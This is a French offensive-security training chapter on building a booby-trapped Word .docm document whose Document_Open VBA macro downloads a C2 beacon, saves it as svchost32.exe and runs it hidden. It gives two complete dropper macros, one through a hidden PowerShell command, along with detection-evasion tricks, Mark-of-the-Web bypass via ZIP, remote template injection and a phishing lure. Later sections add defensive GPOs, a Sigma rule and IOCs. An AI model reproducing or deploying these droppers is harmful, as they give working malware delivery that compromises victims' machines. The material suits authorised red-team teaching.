---
title: 6.3 Création d'un document Word piégé avec macro VBA
description: Fabrication d'un document Office malveillant en lab isolé. Macro VBA auto-exécutée au document ouvert, dropper minimaliste, contournement des avertissements. Perspective attaquant documentée dans le cadre légal strict OmnyAcademy ARTECH.
authors:
  - Zyrass
date:
  created: 2026-05-03
tags:
  - VBA
  - Macro Office
  - Dropper
  - Phishing payload
  - Lab offensif
data-level: 🔴
---

# 6.3 Création d'un document Word piégé avec macro VBA

!!! quote "L'analogie du cadeau empoisonné bien emballé"

    Dans l'Antiquité, un ennemi rusé n'assaillait pas les portes. Il envoyait un présent soigneusement emballé, signé d'un sceau familier. Le serviteur l'apportait directement au seigneur. Le seigneur l'ouvrait. Le venin faisait le reste. Le document Word piégé reproduit ce schéma à la virgule près. L'enveloppe, c'est un fichier `.docm` au nom crédible. Le sceau, c'est le logo ARTECH et la mise en page propre. Le venin, c'est la macro VBA qui s'exécute dès l'ouverture. L'utilisateur a cliqué. Tout commence alors sans bruit.

## Métadonnées du chapitre

Ce chapitre est le premier chapitre offensif du module 6. Voici ses caractéristiques.

| Champ | Valeur |
|---|---|
| Durée estimée | 3 heures |
| Niveau | Pratique offensive - Lab isolé |
| Prérequis | 6.1, 6.2, Microsoft Office ou LibreOffice installé |
| Livrables | Document `.docm` avec macro VBA dropper fonctionnel |
| Auto-explication | 10 minutes |

!!! danger "Cadre légal strict"

    Ce chapitre ne s'applique qu'au lab ARTECH isolé. Tout document produit ici est destiné exclusivement aux machines virtuelles sous votre contrôle. Exécuter ou distribuer ce type de document sur un système sans autorisation écrite préalable constitue une infraction pénale aux articles **323-1**, **323-3** et **323-7** du Code pénal (Loi Godfrain). Peine maximale : **5 ans d'emprisonnement et 150 000 € d'amende**.

## Objectifs pédagogiques

À l'issue de ce chapitre, vous serez capable de :

- Comprendre le modèle objet VBA d'Office et les points d'entrée d'exécution automatique
- Créer une macro auto-exécutée sur ouverture de document
- Écrire un dropper VBA minimaliste téléchargeant et exécutant une charge utile
- Sauvegarder le document au format `.docm` activant les macros
- Analyser les mécanismes de défense côté utilisateur et DSI
- Produire la documentation forensique associée

<br>

---

## 1. Rappels juridiques

### 1.1 Articles applicables

Voici les textes pénaux directement applicables à la création et l'utilisation d'un document piégé.

| Article | Infraction | Peine |
|---|---|---|
| CP 323-1 | Accès frauduleux à un STAD | 3 ans / 100 000 € |
| CP 323-3 | Modification frauduleuse de données | 5 ans / 150 000 € |
| CP 313-1 | Escroquerie (via prétexte dans le doc) | 5 ans / 375 000 € |
| CP 226-4-1 | Usurpation d'identité numérique | 1 an / 15 000 € |
| CP 323-7 | Tentative et complicité | Mêmes peines |

### 1.2 Légalité stricte en lab

L'usage d'un document piégé est légal uniquement dans les conditions suivantes.

| Condition | Statut |
|---|---|
| Machine virtuelle ARTECH isolée (vôtre) | Légal |
| Red team interne avec mandat écrit | Légal |
| Exercice pédagogique lab fermé | Légal |
| Distribution à un tiers non mandaté | Illégal |
| Envoi réel même "pour test" | Illégal |

<br>

---

## 2. Le modèle objet VBA et les points d'entrée

### 2.1 Qu'est-ce que VBA dans Office

**VBA** (Visual Basic for Applications) est le langage de macro embarqué dans Microsoft Office depuis Office 97. Il donne accès au modèle objet complet de l'application : documents, feuilles, cellules, mais aussi le système de fichiers Windows, WMI, et les API Win32.

```text
MODÈLE VBA SIMPLIFIÉ
======================

Application (Word)
  └── Documents
        └── Document (le fichier ouvert)
              ├── Content (le texte)
              ├── ThisDocument (module VBA du document)
              └── VBProject (code VBA)
```

_Le module `ThisDocument` est le point d'entrée naturel pour les macros auto-exécutées._

### 2.2 Points d'entrée automatiques

Word exécute automatiquement certaines procédures sans intervention utilisateur.

| Procédure | Déclenchement | Usage offensif |
|---|---|---|
| `Document_Open()` | Ouverture du document | Principal point d'entrée |
| `AutoOpen()` | Ouverture (compatibilité) | Alias, même effet |
| `Document_Close()` | Fermeture | Nettoyage/persistance |
| `AutoExec()` | Démarrage Word | Modèles `.dotm` |
| `Document_New()` | Création depuis modèle | Modèles partagés |

```vba
' Point d'entrée Document_Open - s'exécute à l'ouverture
Private Sub Document_Open()
    ' Le code ici s'exécute automatiquement
    ' si les macros sont activées
    Call ExecuterCharge
End Sub
```

_`Document_Open` est dans le module `ThisDocument`, pas dans un module standard._

### 2.3 Activation des macros - le seul obstacle

Word affiche une barre d'avertissement jaune si les macros sont désactivées par la stratégie ou si le document provient d'internet (MOTW - Mark of the Web).

```text
SCÉNARIOS MOTW
================

Document téléchargé par email/web
  → MOTW (Zone Identifier ADS) ajouté par Windows
  → Word bloque macros en Protected View d'abord
  → Puis propose "Activer le contenu"
  → Si l'utilisateur clique "Activer" : macros exécutées

Document copié depuis partage réseau interne
  → Pas de MOTW si même zone réseau
  → Macros peuvent s'exécuter sans prompt selon GPO

Contournement en lab
  → Modifier les paramètres de confiance dans Word
  → Ou livrer via ISO/ZIP (perd le MOTW)
```

_En lab, configurer le Centre de gestion de la confidentialité pour activer les macros sans prompt : Fichier → Options → Centre de gestion de la confidentialité → Paramètres → Activer toutes les macros._

<br>

---

## 3. Structure du document piégé ARTECH

### 3.1 Prétexte choisi

Pour le scénario ARTECH, le prétexte optimal identifié au chapitre 6.1 est le **bulletin de salaire confidentiel** ou le **contrat à signer**. Le document doit paraître légitime.

| Composante visuelle | Contenu |
|---|---|
| Logo ARTECH | En-tête professionnel |
| Nom de la cible | Personnalisé depuis OSINT module 4 |
| Objet crédible | "Avenant contrat - À signer avant le 15" |
| Mise en page propre | Police Calibri, corps 11 |
| Message d'action | "Veuillez activer les macros pour afficher le document complet" |

### 3.2 Création du document

Voici la procédure de création du document leurre.

```text
PROCÉDURE CRÉATION DOCUMENT LEURRE
=====================================

1. Ouvrir Microsoft Word (VM lab)

2. Créer la mise en page ARTECH :
   - Insérer logo (créé ou placeholder)
   - Titre : "ARTECH Solutions - Document Confidentiel"
   - Corps : texte flou intentionnel
     "Ce document nécessite l'activation des macros pour afficher
      son contenu complet. Cliquez sur Activer le contenu."

3. Mise en forme professionnelle :
   - Police : Calibri 11
   - Couleurs : gris foncé (#333333) pour le texte
   - Bandeau bleu ARTECH en en-tête

4. Enregistrer en .docm (Format Document Word avec macros)
   Fichier → Enregistrer sous → *.docm
```

_Le format `.docm` est indispensable : le format `.docx` ne peut pas contenir de macros actives._

<br>

---

## 4. Écriture de la macro VBA dropper

### 4.1 Accès à l'éditeur VBA

```text
ACCÉDER À L'ÉDITEUR VBA
==========================

1. Alt + F11 (raccourci universel)
   OU
   Développeur → Visual Basic (activer onglet d'abord)

2. Dans l'arborescence à gauche :
   - "Microsoft Word Objects"
     └── "ThisDocument" (double-cliquer)

3. C'est ici que vous écrivez Document_Open()
```

### 4.2 Macro dropper - Version 1 (téléchargement HTTP)

Cette première version télécharge et exécute un fichier depuis le serveur C2 du lab.

```vba
' ============================================================
' Module : ThisDocument
' Fichier : artech-contrat.docm
' But     : Dropper minimaliste - téléchargement et exécution
' Lab     : ARTECH - usage strictement restreint au lab isolé
' ============================================================

Private Sub Document_Open()
    ' Appel différé pour éviter la détection comportementale
    ' basée sur le timing (action immédiate à l'ouverture = suspect)
    Application.OnTime Now + TimeValue("00:00:03"), "ExecuterCharge"
End Sub

Sub ExecuterCharge()
    Dim sUrl As String
    Dim sDestination As String
    Dim oXHR As Object
    Dim oStream As Object

    ' URL du C2 lab (chapitre 6.5 - Sliver)
    sUrl = "http://192.168.50.20/beacon.exe"

    ' Destination temporaire sur le poste cible
    sDestination = Environ("TEMP") & "\svchost32.exe"

    ' Téléchargement via MSXML2.XMLHTTP (WinHTTP natif)
    On Error GoTo ErrHandle
    Set oXHR = CreateObject("MSXML2.XMLHTTP")
    oXHR.Open "GET", sUrl, False
    oXHR.Send

    ' Écriture en binaire via ADODB.Stream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1        ' adTypeBinary
    oStream.Open
    oStream.Write oXHR.ResponseBody
    oStream.SaveToFile sDestination, 2   ' adSaveCreateOverWrite
    oStream.Close

    ' Exécution silencieuse (fenêtre masquée)
    Shell "cmd /c start /b """ & sDestination & """", vbHide

    ' Nettoyage des références
    Set oXHR = Nothing
    Set oStream = Nothing
    Exit Sub

ErrHandle:
    ' Échec silencieux - aucune boîte de dialogue
    Set oXHR = Nothing
    Set oStream = Nothing
End Sub
```

_`MSXML2.XMLHTTP` et `ADODB.Stream` sont des composants Windows natifs présents sur toutes les installations Office. Aucune dépendance externe n'est nécessaire._

### 4.3 Macro dropper - Version 2 (PowerShell via WScript)

Alternative utilisant PowerShell, plus flexible pour le débogage en lab.

```vba
' ============================================================
' Version PowerShell - Plus verbeux, utile pour le lab
' ============================================================

Private Sub Document_Open()
    Dim sCmd As String
    Dim oShell As Object

    ' Construction de la commande PowerShell
    ' IEX = Invoke-Expression (exécution de chaîne)
    ' Net.WebClient = classe .NET native pour HTTP
    sCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
           """$c = New-Object Net.WebClient; " & _
           "$c.DownloadFile('http://192.168.50.20/beacon.exe', " & _
           "$env:TEMP + '\svchost32.exe'); " & _
           "Start-Process ($env:TEMP + '\svchost32.exe')"""

    ' Exécution via WScript.Shell (natif Windows)
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run sCmd, 0, False   ' 0 = fenêtre masquée, False = non-bloquant

    Set oShell = Nothing
End Sub
```

_`WScript.Shell.Run` avec le paramètre `0` masque complètement la fenêtre PowerShell. Le processus enfant hérite du contexte utilisateur courant._

### 4.4 Comparaison des deux approches

| Critère | MSXML2/ADODB | PowerShell |
|---|---|---|
| Visibilité processus | `winword.exe` uniquement | `powershell.exe` visible dans Tasklist |
| Détection EDR | Faible (API légitimes) | Élevée (PowerShell surveill é) |
| Logging | Minimal | Windows Event 4104, 4688 |
| Flexibilité | Limitée | Très élevée |
| Usage lab | Idéal pour comprendre le mécanisme | Idéal pour déboguer |

<br>

---

## 5. Construction et test en lab

### 5.1 Environnement de test

Avant tout test, isolez correctement l'environnement.

```text
CHECKLIST ISOLATION LAB
=========================

[ ] VM Windows cible : réseau host-only ou réseau lab isolé
[ ] Aucune connexion Internet depuis la VM cible
[ ] Snapshot pris avant le test
[ ] Antivirus désactivé sur la VM cible (test uniquement)
[ ] Wireshark lancé sur l'interface réseau lab
[ ] C2 Sliver actif sur 192.168.50.20 (chapitre 6.5)
```

### 5.2 Test de la macro en isolation

Avant de tester le dropper réseau, testez d'abord que la macro s'exécute.

```vba
' Test isolé - Macro qui affiche une boîte de dialogue
' À utiliser pour confirmer que Document_Open() se déclenche
Private Sub Document_Open()
    MsgBox "Macro exécutée - Document_Open() OK", vbInformation, "Test Lab"
End Sub
```

_Ce test confirme que le point d'entrée fonctionne. Remplacez ensuite par la macro dropper réelle._

### 5.3 Procédure de test complète

Voici la séquence de test en lab.

```text
SÉQUENCE DE TEST
==================

1. Préparer le C2 (VM Kali 192.168.50.20)
   → Chapitre 6.5 (Sliver C2 actif, listener HTTP démarré)

2. Servir le beacon via HTTP depuis le C2
   python3 -m http.server 80
   (le fichier beacon.exe doit être dans le répertoire courant)

3. Depuis la VM cible (Windows)
   → Ouvrir artech-contrat.docm
   → Cliquer "Activer le contenu" si demandé
   → Observer la barre de tâches (svchost32.exe doit apparaître brièvement)

4. Sur le C2 (Kali)
   → Observer la session entrante dans Sliver
   → Confirmer la connexion beacon

5. Documenter les timestamps dans le journal de test
```

### 5.4 Vérification côté cible

```text
VÉRIFICATIONS CIBLE APRÈS OUVERTURE
======================================

Dans le Gestionnaire de tâches Windows :
  → Processus : svchost32.exe (ou le nom choisi)
  → Parent : cmd.exe ou powershell.exe

Dans %TEMP% :
  → Fichier svchost32.exe présent

Dans les logs Windows (Event Viewer) :
  → Event ID 4688 : création de processus
  → Event ID 7045 : nouveau service si persistence
```

<br>

---

## 6. Variantes et techniques avancées

### 6.1 Livraison via fichier ZIP (contournement MOTW)

Le format ZIP ne propage pas le Mark of the Web au contenu extrait sur certaines versions de Windows.

```text
CONTOURNEMENT MOTW PAR ZIP
============================

Technique :
  1. Placer artech-contrat.docm dans un ZIP
  2. Envoyer le ZIP par email (6.7)
  3. L'utilisateur extrait le ZIP
  4. Ouvre le docm extrait
  → Sur Windows 10 < KB5027215 : pas de MOTW sur le docm
  → Macros peuvent s'exécuter sans avertissement

Patch Microsoft (juin 2022+) :
  Windows 11 22H2+ : MOTW propagé dans ZIP
  Windows 10 21H2+ avec KB : MOTW propagé
  
Conséquence défensive :
  Patcher les postes règle ce vecteur.
```

### 6.2 Injection via template distant (Template Injection)

Une variante plus furtive utilise un document `.docx` standard qui charge un template distant contenant la macro.

```text
TEMPLATE INJECTION
====================

Fonctionnement :
  1. Créer la macro dans un template .dotm hébergé sur le C2
  2. Modifier le champ "attachedTemplate" du .docx en pointant
     vers l'URL du C2 (modification XML dans le ZIP du docx)
  3. À l'ouverture du .docx, Word télécharge le template
  4. La macro du template s'exécute

Avantage :
  - Le docx lui-même est "propre" (pas de macro)
  - Passe les filtres antivirus sur le mail
  - MOTW ne s'applique pas au template téléchargé

Fichier à modifier :
  word/_rels/settings.xml.rels dans le ZIP du .docx
```

<br>

---

## 7. Contre-mesures défensives

### 7.1 Protections côté Microsoft 365 / Office

Voici les protections natives disponibles pour contrer les macros malveillantes.

| Protection | Description | Efficacité |
|---|---|---|
| Macros désactivées par GPO | Aucune macro ne s'exécute | Très haute |
| Protected View obligatoire | Lecture seule depuis internet | Haute |
| Trusted Locations uniquement | Macros seulement depuis chemins approuvés | Haute |
| AMSI pour VBA (Office 2019+) | Analyse comportementale des macros | Moyenne |
| Block macros from internet (2022) | Microsoft bloque MOTW par défaut | Très haute |

### 7.2 GPO de blocage des macros

```text
PARAMÈTRE GPO CRITIQUE
========================

Chemin :
  Configuration utilisateur
  → Modèles d'administration
  → Microsoft Word 2016
  → Options Word
  → Sécurité
  → Centre de gestion de la confidentialité

Paramètre :
  "Bloquer les macros Office dans les fichiers provenant d'Internet"
  → Activé

Paramètre supplémentaire :
  "Paramètre VBA Macro Notification Settings"
  → "Disable all without notification" pour postes non-développeurs
```

_Ce paramètre GPO unique réduit à ~0% l'efficacité des macros provenant d'emails. Il est recommandé par l'ANSSI dans le guide "Maîtrise du risque numérique"._

### 7.3 AMSI et journalisation

Depuis Office 2019, le moteur AMSI (Antimalware Scan Interface) analyse le code VBA avant exécution.

```text
AMSI POUR VBA
===============

Fonctionnement :
  → Word soumet le code VBA à l'AMSI avant exécution
  → L'AMSI transmet à l'EDR/AV
  → Si l'EDR détecte un comportement suspect, bloque

Logging Event Viewer :
  → Source : Microsoft-Windows-AMSI/Operational
  → EventID 1101 : scan request
  → EventID 1102 : scan result

Contournement (perspective défense à connaître) :
  Fragmentation du payload, obfuscation strings, 
  appels API indirects - détectés par EDR modernes
```

### 7.4 Indicateurs de compromission (IOC)

Voici les IOC à surveiller après un incident de ce type.

| IOC | Valeur | Source |
|---|---|---|
| Processus parent | `winword.exe` → `cmd.exe` ou `powershell.exe` | Sysmon Event 1 |
| Fichier créé dans %TEMP% | Exécutable `.exe` ou `.dll` | Sysmon Event 11 |
| Connexion réseau depuis Word | HTTP vers IP externe | Sysmon Event 3 |
| Accès registre Run | Persistence post-infection | Sysmon Event 13 |

```text
RÈGLE SIGMA - DÉTECTION MACRO DROPPER
========================================

title: Word document macro executing shell
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\WINWORD.EXE'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\mshta.exe'
  condition: selection
falsepositives:
  - Legitimate macro automation (verify context)
level: high
```

<br>

---

## 8. Documentation forensique du test

Voici le journal à tenir pendant chaque test en lab.

```markdown
# Journal de test - artech-contrat.docm
# Date : YYYY-MM-DD HH:MM

## Configuration lab
- VM Attaquant : Kali 192.168.50.20 (Sliver C2)
- VM Cible     : Windows 10 21H2, 192.168.50.100
- Snapshot avant test : artech-win10-clean

## Déroulé

HH:MM:SS - Document copié sur VM cible via partage SMB lab
HH:MM:SS - Ouverture artech-contrat.docm par double-clic
HH:MM:SS - Barre jaune affichée "Activer le contenu"
HH:MM:SS - Clic "Activer le contenu"
HH:MM:SS - Document_Open() déclenché (timer 3s)
HH:MM:SS - Requête HTTP GET /beacon.exe observée sur C2
HH:MM:SS - beacon.exe créé dans C:\Users\Paul\AppData\Local\Temp\svchost32.exe
HH:MM:SS - Session Sliver ouverte (beacon ID : xxxx)

## Artefacts collectés
- Hash SHA-256 du docm : aabbcc...
- Hash SHA-256 du beacon : ddeeff...
- Capture réseau : artech-test-2026-MMDD.pcap
- Screenshot Sliver session active

## Résultat
Succès - Beacon actif, session C2 établie
```

<br>

---

## 9. Auto-évaluation

Vérifiez votre maîtrise par les questions suivantes.

| # | Question | Réponse |
|---|---|---|
| 1 | Quel format de fichier permet les macros Word ? | `.docm` (pas `.docx`) |
| 2 | Procédure qui s'exécute à l'ouverture ? | `Document_Open()` dans ThisDocument |
| 3 | Composant natif pour téléchargement HTTP en VBA ? | `MSXML2.XMLHTTP` |
| 4 | Composant pour écriture binaire ? | `ADODB.Stream` |
| 5 | Mécanisme de sécurité Microsoft 2022 ? | Blocage macros MOTW (Mark of the Web) |
| 6 | GPO pour bloquer macros internet ? | "Block macros from internet" |
| 7 | Qu'est-ce que l'AMSI pour VBA ? | Analyse comportementale avant exécution |
| 8 | Event ID Sysmon pour processus enfant de Word ? | Event 1 (process creation) |

<br>

---

## 10. Synthèse

```text
DOCUMENT WORD PIÉGÉ - RÉCAPITULATIF
======================================

POINT D'ENTRÉE
  Document_Open() dans ThisDocument
  → s'exécute si macros activées

MÉCANISME DROPPER
  MSXML2.XMLHTTP → télécharge beacon
  ADODB.Stream   → écrit en binaire
  WScript.Shell  → exécute silencieusement

VECTEUR DE LIVRAISON
  Email (6.7) + Postfix (6.2)
  Format .docm ou ZIP pour contourner MOTW

CONTRE-MESURES DÉFENSIVES
  GPO "Block macros from internet" (critique)
  AMSI pour VBA (Office 2019+)
  Protected View obligatoire
  EDR + Sysmon (détection processus enfant de Word)

ARTICLES JURIDIQUES
  CP 323-1 : accès STAD
  CP 323-3 : modification données
  CP 313-1 : escroquerie

IOC CLÉS
  WINWORD.EXE → cmd.exe / powershell.exe
  Fichier .exe dans %TEMP%
  HTTP sortant depuis processus Office
```

## Conclusion

!!! quote "Le document n'est que le vecteur - comprendre la chaîne, c'est la défendre"

> Le chapitre 6.4 aborde l'encodage du payload pour réduire sa visibilité aux scanners statiques. Vous verrez comment la charge que vous venez de créer peut être rendue moins détectable, et surtout comment les défenseurs raisonnent pour contrer ces techniques.

---

**Chapitre précédent** : [6.2 Infrastructure SMTP - Postfix avec SPF/DKIM/DMARC](02-infrastructure-smtp-postfix.md)

**Chapitre suivant** : [6.4 Encodage du payload pour échapper aux scanners](04-encodage-payload-evasion.md)
